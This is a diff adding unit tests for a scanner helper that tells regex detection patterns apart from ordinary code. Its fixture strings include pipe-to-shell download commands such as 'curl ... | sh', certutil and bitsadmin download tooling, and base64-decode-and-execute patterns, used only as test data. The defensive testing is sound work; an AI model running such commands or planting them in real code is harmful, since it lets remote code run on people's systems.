@@ -1,6 +1,7 @@
 import { describe, expect, it } from "vitest";
 
 import {
+  inSearchPattern,
   SCAN_WINDOW,
   closingQuote,
   decode,
@@ -154,5 +155,48 @@ describe("snippet", () => {
 
   it("defangs URLs and trims", () => {
     expect(snippet("   curl https://x.example/a | sh  ")).toBe("curl hxxps://x[.]example/a | sh");
+  });
+});
+
+describe("inSearchPattern", () => {
+  const at = (line: string, needle: string) => line.indexOf(needle);
+
+  it("finds JavaScript regex literals but not divisions", () => {
+    const line = "const P = /certutil|bitsadmin/i;";
+    expect(inSearchPattern("src/rules.ts", line, at(line, "certutil"))).toBe(true);
+    const div = "const x = a / certutil / b;";
+    expect(inSearchPattern("src/x.ts", div, at(div, "certutil"))).toBe(false);
+    const ret = "  return /frombase64string/i.test(s);";
+    expect(inSearchPattern("src/x.js", ret, at(ret, "frombase64string"))).toBe(true);
+  });
+
+  it("finds the string arguments of regex constructors, including String.raw templates", () => {
+    const js = 'new RegExp(String.raw`frombase64string.{0,200}?` + PIPE + "iex", "i")';
+    expect(inSearchPattern("a.ts", js, at(js, "frombase64string"))).toBe(true);
+    expect(inSearchPattern("a.ts", js, at(js, "iex"))).toBe(true);
+    const py = 'ENCODED = re.compile(r"iex.{0,120}frombase64string", re.I)';
+    expect(inSearchPattern("a.py", py, at(py, "iex"))).toBe(true);
+    const go = 'var p = regexp.MustCompile(`curl .* | sh`)';
+    expect(inSearchPattern("a.go", go, at(go, "curl"))).toBe(true);
+  });
+
+  it("does not treat ordinary strings and code as patterns", () => {
+    const cmd = 'execSync("curl https://x.invalid | sh")';
+    expect(inSearchPattern("a.js", cmd, at(cmd, "curl"))).toBe(false);
+    const plain = 'const cmd = "certutil -urlcache";';
+    expect(inSearchPattern("a.ts", plain, at(plain, "certutil"))).toBe(false);
+  });
+
+  it("gives up when the same line runs text", () => {
+    const hidden = "eval(/require('child_process')/.source)";
+    expect(inSearchPattern("a.js", hidden, at(hidden, "require"))).toBe(false);
+    const py = 'exec(re.compile(r"print(1)").pattern)';
+    expect(inSearchPattern("a.py", py, at(py, "print"))).toBe(false);
+  });
+
+  it("only knows code files", () => {
+    const line = "/certutil/";
+    expect(inSearchPattern("notes.txt", line, 1)).toBe(false);
+    expect(inSearchPattern("README.md", line, 1)).toBe(false);
   });
 });
